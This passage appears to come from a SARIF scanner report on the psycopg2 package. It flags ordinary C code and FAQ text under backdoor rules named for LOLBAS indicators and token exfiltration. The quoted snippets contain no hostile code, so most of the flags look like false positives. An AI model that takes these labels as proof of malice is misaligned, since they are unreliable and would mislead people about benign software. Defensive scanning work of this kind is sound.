                    "rendered": {
                      "text": "        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 0);\n\nexit:\n    PQconninfoFree(options);\n",
                      "markdown": "`        goto exit;\n    }\n\n    res = psyco_dict_from_conninfo_options(options, /* include_password = */ 0);\n\nexit:\n    PQconninfoFree(options);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_list.c"
                },
                "region": {
                  "startLine": 275,
                  "startColumn": 46,
                  "endLine": 275,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    PyObject_GC_UnTrack((PyObject *)self);\n    list_clear(self);\n\n    Dprintf(\"list_dealloc: deleted list object at %p, \"\n            \"refcnt = \" FORMAT_CODE_PY_SSIZE_T, self, Py_REFCNT(self));\n\n    Py_TYPE(self)->tp_free((PyObject *)self);\n",
                    "rendered": {
                      "text": "    PyObject_GC_UnTrack((PyObject *)self);\n    list_clear(self);\n\n    Dprintf(\"list_dealloc: deleted list object at %p, \"\n            \"refcnt = \" FORMAT_CODE_PY_SSIZE_T, self, Py_REFCNT(self));\n\n    Py_TYPE(self)->tp_free((PyObject *)self);\n",
                      "markdown": "`    PyObject_GC_UnTrack((PyObject *)self);\n    list_clear(self);\n\n    Dprintf(\"list_dealloc: deleted list object at %p, \"\n            \"refcnt = \" FORMAT_CODE_PY_SSIZE_T, self, Py_REFCNT(self));\n\n    Py_TYPE(self)->tp_free((PyObject *)self);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_list.c"
                },
                "region": {
                  "startLine": 246,
                  "startColumn": 41,
                  "endLine": 246,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"list_setup: good list object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"list_setup: good list object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"list_setup: good list object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_list.c"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 41,
                  "endLine": 234,
                  "endColumn": 45,
                  "snippet": {
                    "text": "static int\nlist_setup(listObject *self, PyObject *obj)\n{\n    Dprintf(\"list_setup: init list object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\nlist_setup(listObject *self, PyObject *obj)\n{\n    Dprintf(\"list_setup: init list object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\nlist_setup(listObject *self, PyObject *obj)\n{\n    Dprintf(\"list_setup: init list object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/config.h"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 31,
                  "endLine": 58,
                  "endColumn": 36,
                  "snippet": {
                    "text": "#ifdef PSYCOPG_DEBUG\n#define Dprintf(fmt, args...) \\\n    if (!psycopg_debug_enabled) ; else \\\n        fprintf(stderr, \"[%d] \" fmt \"\\n\", (int) getpid() , ## args)\n#else\n#define Dprintf(fmt, args...)\n#endif\n",
                    "rendered": {
                      "text": "#ifdef PSYCOPG_DEBUG\n#define Dprintf(fmt, args...) \\\n    if (!psycopg_debug_enabled) ; else \\\n        fprintf(stderr, \"[%d] \" fmt \"\\n\", (int) getpid() , ## args)\n#else\n#define Dprintf(fmt, args...)\n#endif\n",
                      "markdown": "`#ifdef PSYCOPG_DEBUG\n#define Dprintf(fmt, args...) \\\n    if (!psycopg_debug_enabled) ; else \\\n        fprintf(stderr, \"[%d] \" fmt \"\\n\", (int) getpid() , ## args)\n#else\n#define Dprintf(fmt, args...)\n#endif\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/utils.c"
                },
                "region": {
                  "startLine": 261,
                  "startColumn": 53,
                  "endLine": 261,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    if (!(dict = PyDict_New())) { goto exit; }\n    for (o = options; o->keyword != NULL; o++) {\n        if (o->val != NULL &&\n            (include_password || strcmp(o->keyword, \"password\") != 0)) {\n            PyObject *value;\n            if (!(value = Text_FromUTF8(o->val))) { goto exit; }\n            if (PyDict_SetItemString(dict, o->keyword, value) != 0) {\n",
                    "rendered": {
                      "text": "    if (!(dict = PyDict_New())) { goto exit; }\n    for (o = options; o->keyword != NULL; o++) {\n        if (o->val != NULL &&\n            (include_password || strcmp(o->keyword, \"password\") != 0)) {\n            PyObject *value;\n            if (!(value = Text_FromUTF8(o->val))) { goto exit; }\n            if (PyDict_SetItemString(dict, o->keyword, value) != 0) {\n",
                      "markdown": "`    if (!(dict = PyDict_New())) { goto exit; }\n    for (o = options; o->keyword != NULL; o++) {\n        if (o->val != NULL &&\n            (include_password || strcmp(o->keyword, \"password\") != 0)) {\n            PyObject *value;\n            if (!(value = Text_FromUTF8(o->val))) { goto exit; }\n            if (PyDict_SetItemString(dict, o->keyword, value) != 0) {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/utils.c"
                },
                "region": {
                  "startLine": 261,
                  "startColumn": 21,
                  "endLine": 261,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    if (!(dict = PyDict_New())) { goto exit; }\n    for (o = options; o->keyword != NULL; o++) {\n        if (o->val != NULL &&\n            (include_password || strcmp(o->keyword, \"password\") != 0)) {\n            PyObject *value;\n            if (!(value = Text_FromUTF8(o->val))) { goto exit; }\n            if (PyDict_SetItemString(dict, o->keyword, value) != 0) {\n",
                    "rendered": {
                      "text": "    if (!(dict = PyDict_New())) { goto exit; }\n    for (o = options; o->keyword != NULL; o++) {\n        if (o->val != NULL &&\n            (include_password || strcmp(o->keyword, \"password\") != 0)) {\n            PyObject *value;\n            if (!(value = Text_FromUTF8(o->val))) { goto exit; }\n            if (PyDict_SetItemString(dict, o->keyword, value) != 0) {\n",
                      "markdown": "`    if (!(dict = PyDict_New())) { goto exit; }\n    for (o = options; o->keyword != NULL; o++) {\n        if (o->val != NULL &&\n            (include_password || strcmp(o->keyword, \"password\") != 0)) {\n            PyObject *value;\n            if (!(value = Text_FromUTF8(o->val))) { goto exit; }\n            if (PyDict_SetItemString(dict, o->keyword, value) != 0) {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/utils.c"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 72,
                  "endLine": 253,
                  "endColumn": 80,
                  "snippet": {
                    "text": "\n/* Make a dict out of PQconninfoOption array */\nPyObject *\npsyco_dict_from_conninfo_options(PQconninfoOption *options, int include_password)\n{\n    PyObject *dict, *res = NULL;\n    PQconninfoOption *o;\n",
                    "rendered": {
                      "text": "\n/* Make a dict out of PQconninfoOption array */\nPyObject *\npsyco_dict_from_conninfo_options(PQconninfoOption *options, int include_password)\n{\n    PyObject *dict, *res = NULL;\n    PQconninfoOption *o;\n",
                      "markdown": "`\n/* Make a dict out of PQconninfoOption array */\nPyObject *\npsyco_dict_from_conninfo_options(PQconninfoOption *options, int include_password)\n{\n    PyObject *dict, *res = NULL;\n    PQconninfoOption *o;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 364,
                  "startColumn": 54,
                  "endLine": 364,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n",
                    "rendered": {
                      "text": "    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n",
                      "markdown": "`    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 364,
                  "startColumn": 24,
                  "endLine": 364,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n",
                    "rendered": {
                      "text": "    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n",
                      "markdown": "`    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n\n    .. |lo_truncate| replace:: `!lo_truncate()`\n    .. _lo_truncate: https://www.postgresql.org/docs/current/static/lo-interfaces.html#LO-TRUNCATE\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 361,
                  "startColumn": 50,
                  "endLine": 361,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n",
                    "rendered": {
                      "text": "\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n",
                      "markdown": "`\n        $ ldd /path/to/packages/psycopg2/_psycopg.so | grep libpq\n\n    to find what is the libpq dynamic library used at runtime.\n\n    You can avoid the problem by using the same version of the\n    :program:`pg_config` at install time and the libpq at runtime.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 353,
                  "startColumn": 3,
                  "endLine": 353,
                  "endColumn": 7,
                  "snippet": {
                    "text": "    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n\n",
                    "rendered": {
                      "text": "    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n\n",
                      "markdown": "`    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 58,
                  "endLine": 352,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n",
                    "rendered": {
                      "text": "\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n",
                      "markdown": "`\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 38,
                  "endLine": 352,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n",
                    "rendered": {
                      "text": "\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n",
                      "markdown": "`\n    Fast-forward several years, if the message reports *undefined symbol:\n    lo_truncate64* it means that Psycopg was built with large objects 64 bits\n    API support (*i.e.* the libpq used at compile time was at least 9.3) but\n    at runtime an older libpq dynamic library is found.\n\n    You can use:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 347,
                  "startColumn": 58,
                  "endLine": 347,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n",
                    "rendered": {
                      "text": "\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n",
                      "markdown": "`\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 347,
                  "startColumn": 18,
                  "endLine": 347,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n",
                    "rendered": {
                      "text": "\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n",
                      "markdown": "`\n`!psycopg2` raises `!ImportError` with message *_psycopg.so: undefined symbol: lo_truncate* when imported.\n    This means that Psycopg was compiled with |lo_truncate|_ support (*i.e.*\n    the libpq used at compile time was version >= 8.3) but at runtime an older\n    libpq dynamic library is found.\n\n    Fast-forward several years, if the message reports *undefined symbol:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 276,
                  "startColumn": 64,
                  "endLine": 276,
                  "endColumn": 68,
                  "snippet": {
                    "text": "    The only disadvantages is that they use up resources on the server and\n    that there is a little overhead because at least two queries (one to\n    create the cursor and one to fetch the initial result set) are issued to\n    the backend. The advantage is that data is fetched one chunk at a time:\n    using small `~cursor.fetchmany()` values it is possible to use very\n    little memory on the client and to skip or discard parts of the result set.\n\n",
                    "rendered": {
                      "text": "    The only disadvantages is that they use up resources on the server and\n    that there is a little overhead because at least two queries (one to\n    create the cursor and one to fetch the initial result set) are issued to\n    the backend. The advantage is that data is fetched one chunk at a time:\n    using small `~cursor.fetchmany()` values it is possible to use very\n    little memory on the client and to skip or discard parts of the result set.\n\n",
                      "markdown": "`    The only disadvantages is that they use up resources on the server and\n    that there is a little overhead because at least two queries (one to\n    create the cursor and one to fetch the initial result set) are issued to\n    the backend. The advantage is that data is fetched one chunk at a time:\n    using small `~cursor.fetchmany()` values it is possible to use very\n    little memory on the client and to skip or discard parts of the result set.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 274,
                  "startColumn": 43,
                  "endLine": 274,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\nWhat are the advantages or disadvantages of using named cursors?\n    The only disadvantages is that they use up resources on the server and\n    that there is a little overhead because at least two queries (one to\n    create the cursor and one to fetch the initial result set) are issued to\n    the backend. The advantage is that data is fetched one chunk at a time:\n    using small `~cursor.fetchmany()` values it is possible to use very\n",
                    "rendered": {
                      "text": "\nWhat are the advantages or disadvantages of using named cursors?\n    The only disadvantages is that they use up resources on the server and\n    that there is a little overhead because at least two queries (one to\n    create the cursor and one to fetch the initial result set) are issued to\n    the backend. The advantage is that data is fetched one chunk at a time:\n    using small `~cursor.fetchmany()` values it is possible to use very\n",
                      "markdown": "`\nWhat are the advantages or disadvantages of using named cursors?\n    The only disadvantages is that they use up resources on the server and\n    that there is a little overhead because at least two queries (one to\n    create the cursor and one to fetch the initial result set) are issued to\n    the backend. The advantage is that data is fetched one chunk at a time:\n    using small `~cursor.fetchmany()` values it is possible to use very\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 48,
                  "endLine": 222,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    - set the bytea_output__ parameter to ``escape`` in the server;\n    - execute the database command ``SET bytea_output TO escape;`` in the\n      session before reading binary data;\n    - upgrade the libpq library on the client to at least 9.0.\n\n    .. __: https://www.postgresql.org/docs/current/static/datatype-binary.html\n    .. __: https://www.postgresql.org/docs/current/static/runtime-config-client.html#GUC-BYTEA-OUTPUT\n",
                    "rendered": {
                      "text": "    - set the bytea_output__ parameter to ``escape`` in the server;\n    - execute the database command ``SET bytea_output TO escape;`` in the\n      session before reading binary data;\n    - upgrade the libpq library on the client to at least 9.0.\n\n    .. __: https://www.postgresql.org/docs/current/static/datatype-binary.html\n    .. __: https://www.postgresql.org/docs/current/static/runtime-config-client.html#GUC-BYTEA-OUTPUT\n",
                      "markdown": "`    - set the bytea_output__ parameter to ``escape`` in the server;\n    - execute the database command ``SET bytea_output TO escape;`` in the\n      session before reading binary data;\n    - upgrade the libpq library on the client to at least 9.0.\n\n    .. __: https://www.postgresql.org/docs/current/static/datatype-binary.html\n    .. __: https://www.postgresql.org/docs/current/static/runtime-config-client.html#GUC-BYTEA-OUTPUT\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 3,
                  "endLine": 90,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\nWhy does `!cursor.execute()` raise the exception *can't adapt*?\n    Psycopg converts Python objects in a SQL string representation by looking\n    at the object class.  The exception is raised when you are trying to pass\n    as query parameter an object for which there is no adapter registered for\n    its class.  See :ref:`adapting-new-types` for informations.\n\n",
                    "rendered": {
                      "text": "\nWhy does `!cursor.execute()` raise the exception *can't adapt*?\n    Psycopg converts Python objects in a SQL string representation by looking\n    at the object class.  The exception is raised when you are trying to pass\n    as query parameter an object for which there is no adapter registered for\n    its class.  See :ref:`adapting-new-types` for informations.\n\n",
                      "markdown": "`\nWhy does `!cursor.execute()` raise the exception *can't adapt*?\n    Psycopg converts Python objects in a SQL string representation by looking\n    at the object class.  The exception is raised when you are trying to pass\n    as query parameter an object for which there is no adapter registered for\n    its class.  See :ref:`adapting-new-types` for informations.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 14,
                  "endLine": 53,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    unused for a long time (which may also be a few seconds, depending on the\n    concurrency level in your database).  Alternatively you can use a\n    connection in `~connection.autocommit` mode to avoid a new transaction to\n    be started at the first command.\n\n\n.. _faq-transaction-aborted:\n",
                    "rendered": {
                      "text": "    unused for a long time (which may also be a few seconds, depending on the\n    concurrency level in your database).  Alternatively you can use a\n    connection in `~connection.autocommit` mode to avoid a new transaction to\n    be started at the first command.\n\n\n.. _faq-transaction-aborted:\n",
                      "markdown": "`    unused for a long time (which may also be a few seconds, depending on the\n    concurrency level in your database).  Alternatively you can use a\n    connection in `~connection.autocommit` mode to avoid a new transaction to\n    be started at the first command.\n\n\n.. _faq-transaction-aborted:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/faq.rst"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 57,
